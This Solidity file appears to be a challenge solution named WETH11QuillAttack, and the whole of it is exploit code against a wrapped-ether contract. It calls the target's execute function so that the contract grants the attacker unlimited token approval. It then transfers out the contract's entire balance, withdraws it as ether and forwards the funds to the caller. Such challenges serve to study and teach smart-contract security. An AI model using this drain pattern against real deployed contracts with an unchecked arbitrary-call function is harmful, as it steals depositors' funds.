// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./WETH11.sol";

contract WETH11QuillAttack {
    
    function attack(address payable target) public {
        WETH11Quill weth = WETH11Quill(target);

        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), 2**256-1);
        weth.execute(address(weth), 0, data);
        ERC20(weth).transferFrom(address(weth), address(this), weth.balanceOf(address(weth)));
        weth.withdrawAll();
        (bool success, ) = address(msg.sender).call{value:address(this).balance}("");
        require(success);
    }
    receive() external payable {}
}
